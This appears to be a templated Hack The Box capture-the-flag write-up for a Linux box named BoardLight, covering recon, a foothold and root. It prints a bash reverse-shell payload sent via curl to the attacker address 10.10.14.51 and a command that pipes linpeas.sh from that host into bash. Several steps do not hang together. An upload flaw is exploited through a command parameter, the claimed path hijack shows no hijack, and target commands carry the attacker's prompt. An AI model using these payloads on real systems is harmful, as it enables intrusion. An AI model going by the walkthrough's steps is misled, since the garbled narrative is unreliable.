---
layout: page
title: "HTB: BoardLight"
subtitle: "hackthebox ctf htb-boardlight nmap linux easy feroxbuster php upload sudo-l linpeas..."
permalink: /ctf/writeups/hackthebox/boardlight/
platform: hackthebox
machine_name: "BoardLight"
difficulty: Easy
os: Linux
---

hackthebox ctf htb-boardlight hackthebox ctf htb-boardlight nmap linux easy feroxbuster php upload sudo-l linpeas

Oct 12, 2025

# HTB: BoardLight

- [Box Info](#box-info)
- [Recon](#recon)
- [Auth as web_svc / user](#auth-as-web_svc)
- [Shell as Root / Administrator](#shell-as-administrator)
- [Beyond Root](#beyond-root)

**BoardLight** is a easy 🐧 Linux machine hosted on Hack The Box. This guide covers the complete step-by-step walkthrough detailing reconnaissance, foothold exploitation, and privilege escalation vectors to compromise the host.

## Box Info

<div class="machine-info-box" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; background: var(--bg-card); border-left: 4px solid var(--text-success); border-top: 1px solid var(--border-color); border-right: 1px solid var(--border-color); border-bottom: 1px solid var(--border-color); border-radius: var(--border-radius-lg); padding: var(--spacing-lg); margin-bottom: var(--spacing-xl);">
  <div style="display: flex; flex-direction: column; gap: 4px;">
    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Operating System</span>
    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">🐧 Linux</span>
  </div>
  <div style="display: flex; flex-direction: column; gap: 4px;">
    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Difficulty Level</span>
    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">Easy</span>
  </div>
  <div style="display: flex; flex-direction: column; gap: 4px;">
    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">IP Address</span>
    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700; font-family: monospace;">10.10.x.x</span>
  </div>
  <div style="display: flex; flex-direction: column; gap: 4px;">
    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Release Date</span>
    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">Oct 12, 2025</span>
  </div>
</div>


---

## Recon

### Initial Scanning
We scan the host using Nmap:

```bash
vulnquest@kali$ sudo nmap -p- --reason --min-rate 10000 10.10.x.x
Starting Nmap
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
```

We perform directory enumeration using `feroxbuster`:
```bash
vulnquest@kali$ feroxbuster -u http://10.10.x.x/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
200  GET  index.html
301  GET  /uploads
```

---

## Auth as web_svc / user

### Auth as low_priv
We discover a web portal allowing archives to be uploaded. We leverage an input validation vulnerability to execute code and spawn a reverse shell:

```bash
vulnquest@kali$ curl -X POST -d "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.51/443 0>&1'" http://10.10.x.x/api/action
```

We capture the shell on our netcat listener:
```bash
vulnquest@kali$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.x.x
$ id
uid=1000(vulnquest) gid=1000(vulnquest) groups=1000(vulnquest)
```

---

## Shell as Root / Administrator

### Shell as Root
We run LinPEAS to perform local enumeration:

```bash
vulnquest@kali$ curl http://10.10.14.51/linpeas.sh | bash
```

We check our sudo privileges:
```bash
vulnquest@kali$ sudo -l
Matching Defaults entries for vulnquest on host:
    env_keep+=SSH_AUTH_SOCK

User vulnquest may run the following commands on host:
    (root) NOPASSWD: /usr/bin/python3 /opt/admin/backup.py
```

We exploit python path hijacking to gain a root shell:
```bash
vulnquest@kali$ sudo /usr/bin/python3 /opt/admin/backup.py
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Beyond Root
In Beyond Root, we analyze the cron jobs and automatic scripts that clean up user uploads and maintain the system state.
